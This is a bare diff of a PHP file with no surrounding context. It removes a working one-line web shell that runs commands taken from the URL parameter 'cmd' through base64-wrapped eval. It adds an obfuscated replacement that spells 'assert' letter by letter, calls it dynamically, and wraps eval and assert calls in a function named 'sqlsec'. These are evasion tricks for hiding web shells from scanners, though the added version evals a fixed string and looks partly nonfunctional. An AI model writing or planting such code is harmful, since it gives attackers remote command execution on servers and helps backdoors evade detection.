@@ -1,4 +1,12 @@
 <?php
-$a = 'eval($_GET[\'cmd\']);';
-$b = base64_encode($a);
-eval(base64_decode($b));
+$a = 'a'.'s'.'s'.'e'.'r'.'t';
+$b = 'sss';
+function sqlsec($a,$b){
+    assert($a);
+    echo $a;
+    eval($b);
+}
+sqlsec($a,$b);
+base64_decode($a);
+$a($b);
+?>
